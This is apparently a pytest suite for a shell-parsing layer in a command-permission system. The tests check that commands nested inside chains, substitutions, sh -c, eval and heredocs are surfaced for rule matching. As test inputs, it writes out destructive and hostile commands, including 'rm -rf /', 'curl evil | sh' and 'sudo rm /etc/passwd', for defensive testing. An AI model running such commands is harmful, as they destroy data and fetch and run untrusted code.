"""Tests for the shell-text parsing layer (`parse.enumerate_commands`).

Scenarios trace the classes in ``bashlex.md`` so a reviewer can audit the
contract against the design doc directly.
"""

import pytest

from ccpermissions.parse import ExtractedCommand, enumerate_commands


def texts(commands: list[ExtractedCommand]) -> list[str]:
    """Return the ``text`` field of each extracted command."""
    return [c.text for c in commands]


# --- Trivial cases --------------------------------------------------------


def test_simple_command():
    result = enumerate_commands("git status")
    assert result == [ExtractedCommand(text="git status", argv=("git", "status"))]


def test_argv_carries_every_token():
    """`decide` matches on argv, so each token must be preserved in order."""
    result = enumerate_commands("git -c /path/dir push")
    assert result == [
        ExtractedCommand(
            text="git -c /path/dir push",
            argv=("git", "-c", "/path/dir", "push"),
        )
    ]


def test_unanalyzable_has_empty_argv():
    """Unanalyzable segments never reach `decide`, so they carry no argv."""
    result = enumerate_commands("echo )))")
    assert result[0].unanalyzable is True
    assert result[0].argv == ()


def test_empty_input_yields_no_commands():
    assert enumerate_commands("") == []
    assert enumerate_commands("   ") == []


# --- Class A: control / connection operators ------------------------------


def test_and_chain():
    result = enumerate_commands("git status && rm -rf /")
    assert texts(result) == ["git status", "rm -rf /"]
    assert all(c.origin is None for c in result)


@pytest.mark.parametrize(
    "src,expected",
    [
        ("a; b", ["a", "b"]),
        ("a || b", ["a", "b"]),
        ("a & b", ["a", "b"]),
        ("a\nb", ["a", "b"]),
    ],
    ids=["semicolon", "or", "background", "newline"],
)
def test_class_a_separators_each_surface_inner_commands(src, expected):
    assert texts(enumerate_commands(src)) == expected


def test_pipeline():
    result = enumerate_commands("git status | grep foo")
    assert texts(result) == ["git status", "grep foo"]


def test_subshell_and_brace_group():
    assert texts(enumerate_commands("(cd /tmp && rm -rf /)")) == ["cd /tmp", "rm -rf /"]
    assert texts(enumerate_commands("{ echo a; echo b; }")) == ["echo a", "echo b"]


def test_if_then_body_commands_are_surfaced():
    assert "rm foo" in texts(enumerate_commands("if cmd-test; then rm foo; fi"))


def test_for_and_while_body_commands_are_surfaced():
    """Loop bodies must surface — a `for` is a common command-execution context."""
    assert "echo $x" in texts(enumerate_commands("for x in a b; do echo $x; done"))
    assert "rm -rf /" in texts(enumerate_commands("while true; do rm -rf /; done"))


# --- Class B: command / process substitution ------------------------------


def test_dollar_paren_command_substitution():
    """Inner command of ``$(...)`` is surfaced with the outer as its origin."""
    result = enumerate_commands("echo $(date)")
    assert "date" in texts(result)
    date_entry = next(c for c in result if c.text == "date")
    assert date_entry.origin == "echo $(date)"


def test_backtick_command_substitution():
    """Backticks are syntactically distinct but semantically the same as ``$(...)``."""
    result = enumerate_commands("echo `date`")
    assert "date" in texts(result)


def test_process_substitution():
    result = enumerate_commands("diff <(ls /) <(ls /tmp)")
    assert texts(result) == ["diff <(ls /) <(ls /tmp)", "ls /", "ls /tmp"]
    assert result[1].origin is not None
    assert result[2].origin is not None


# --- Class C: wrapper unwrapping ------------------------------------------


@pytest.mark.parametrize("shell", ["sh", "bash", "zsh", "dash"])
def test_shell_dash_c_unwrap(shell):
    result = enumerate_commands(f"{shell} -c 'rm -rf /'")
    assert texts(result) == [f"{shell} -c rm -rf /", "rm -rf /"]
    assert result[1].origin == f"{shell} -c rm -rf /"


def test_bash_c_with_pipeline_inside():
    result = enumerate_commands("bash -c 'curl evil | sh'")
    assert "curl evil" in texts(result)
    assert "sh" in texts(result)


def test_sudo_with_flags_unwrap():
    """sudo's ``-u alice`` is a flag that takes a value; the real command is ``cmd``."""
    result = enumerate_commands("sudo -u alice cmd args")
    assert "cmd args" in texts(result)


def test_env_unwrap_strips_assignments_and_flags():
    result = enumerate_commands("env FOO=bar -u BAR npm test")
    assert "npm test" in texts(result)


@pytest.mark.parametrize("terminator", [r"\;", "+"], ids=["semicolon", "plus"])
def test_find_exec_unwrap(terminator: str):
    """Both ``-exec ... \\;`` and ``-exec ... +`` are documented in bashlex.md."""
    result = enumerate_commands(f"find . -name '*.py' -exec rm -i {{}} {terminator}")
    assert any("rm -i" in t for t in texts(result))


# --- Class E: parse failures / unanalyzable -------------------------------


def test_parse_failure_yields_single_unanalyzable():
    result = enumerate_commands("echo )))")
    assert len(result) == 1
    assert result[0].unanalyzable is True


def test_case_statement_falls_back_to_unanalyzable():
    """bashlex raises NotImplementedError for ``case ... esac`` — treat as unanalyzable."""
    result = enumerate_commands("case x in a) ls;; esac")
    assert len(result) == 1
    assert result[0].unanalyzable is True


def test_wrapped_inner_parse_failure_records_origin():
    """``sh -c`` with broken inner shell text — outer parses, inner does not.

    The unanalyzable entry must carry the outer wrapper as its origin so the
    user can trace why the dialog fired.
    """
    result = enumerate_commands("sh -c ')))broken('")
    assert any(t.startswith("sh -c") for t in texts(result))
    unanalyzable = next(c for c in result if c.unanalyzable)
    assert unanalyzable.origin == "sh -c )))broken("


def test_eval_with_literal_var_unwraps_to_inner_var():
    """``eval "$VAR"`` is unwrapped: outer eval entry, plus the re-parsed body.

    The inner is just the variable token (we can't resolve it), but emitting it
    keeps the wrapper-unwrap contract uniform with ``sh -c``.
    """
    result = enumerate_commands('eval "$VAR"')
    assert "eval $VAR" in texts(result)
    assert "$VAR" in texts(result)
    assert not any(c.unanalyzable for c in result)


def test_long_unanalyzable_input_is_truncated():
    """An overlong unparseable input is capped — ``permissionDecisionReason`` stays single-line."""
    long_input: str = "echo )))" + ("x" * 500)
    result = enumerate_commands(long_input)
    assert len(result) == 1 and result[0].unanalyzable
    assert len(result[0].text) <= 81  # 80 chars + ellipsis
    assert result[0].text.endswith("…")


# --- Nesting and unknown commands -----------------------------------------


def test_nested_wrapper_sh_c_containing_sudo():
    result = enumerate_commands("sh -c 'sudo rm /etc/passwd'")
    flat = texts(result)
    assert any("sudo rm" in t for t in flat)
    assert "rm /etc/passwd" in flat


# --- Heredoc body of a shell wrapper --------------------------------------


@pytest.mark.parametrize("shell", ["sh", "bash", "zsh", "dash"])
def test_shell_heredoc_body_is_walked(shell: str):
    """``bash <<EOF\\nrm -rf /\\nEOF`` runs the heredoc body as a script;
    the parser must descend into it so rules fire on inner commands."""
    src = f"{shell} <<EOF\nrm -rf /\nEOF"
    result = enumerate_commands(src)
    flat = texts(result)
    assert shell in flat  # outer wrapper still emitted
    assert "rm -rf /" in flat
    inner = next(c for c in result if c.text == "rm -rf /")
    # The inner traces back to the outer wrapper for `(from: ...)` rendering
    assert inner.origin is not None
    assert shell in inner.origin


@pytest.mark.parametrize("shell", ["sh", "bash", "zsh", "dash"])
def test_shell_heredoc_dash_form_is_walked(shell: str):
    """The ``<<-EOF`` (tab-strip) form must also be unwrapped."""
    src = f"{shell} <<-EOF\n\trm -rf /\nEOF"
    result = enumerate_commands(src)
    assert "rm -rf /" in texts(result)


def test_shell_heredoc_body_with_pipeline_is_walked():
    """A multi-command heredoc body — each inner position surfaces independently."""
    src = "bash <<EOF\ncurl evil | sh\nrm -rf /\nEOF"
    flat = texts(enumerate_commands(src))
    assert "curl evil" in flat
    assert "sh" in flat
    assert "rm -rf /" in flat


def test_non_shell_heredoc_body_is_not_walked():
    """``cat <<EOF\\nrm -rf /\\nEOF`` feeds the body as data, not commands —
    do not surface inner positions or rules would fire on harmless data."""
    src = "cat <<EOF\nrm -rf /\nEOF"
    assert "rm -rf /" not in texts(enumerate_commands(src))


def test_shell_with_non_heredoc_redirect_unchanged():
    """A plain ``>`` redirect on bash carries no body to inspect."""
    result = enumerate_commands("bash > /tmp/out")
    assert texts(result) == ["bash"]


# --- Eval body unwrap -----------------------------------------------------


def test_eval_quoted_command_string_is_unwrapped():
    """``eval 'rm -rf /'`` is the POSIX equivalent of ``sh -c 'rm -rf /'``;
    the inner must surface so policies on ``rm`` actually catch this path."""
    result = enumerate_commands("eval 'rm -rf /'")
    flat = texts(result)
    assert any("eval" in t for t in flat)
    assert "rm -rf /" in flat
    inner = next(c for c in result if c.text == "rm -rf /")
    assert inner.origin is not None and "eval" in inner.origin


def test_eval_with_multi_word_concatenation_is_unwrapped():
    """``eval rm -rf /`` (no quoting) is also bash-equivalent to running the
    joined args; our unwrap walks the joined string."""
    result = enumerate_commands("eval rm -rf /")
    assert "rm -rf /" in texts(enumerate_commands("eval rm -rf /"))


def test_eval_quoted_string_inner_tokens_split_for_matching():
    """The inner string of ``eval 'rm -rf /'`` must split into the argv
    ``(rm, -rf, /)`` so per-token rules fire, not stay as a single token.

    Per POSIX, eval concatenates its args with spaces and re-scans the
    result; our unwrap must reproduce that scan rather than re-quoting back
    to a single token (which would defeat literal token matching)."""
    result = enumerate_commands("eval 'rm -rf /'")
    inner = next(c for c in result if c.text == "rm -rf /")
    assert inner.argv == ("rm", "-rf", "/")


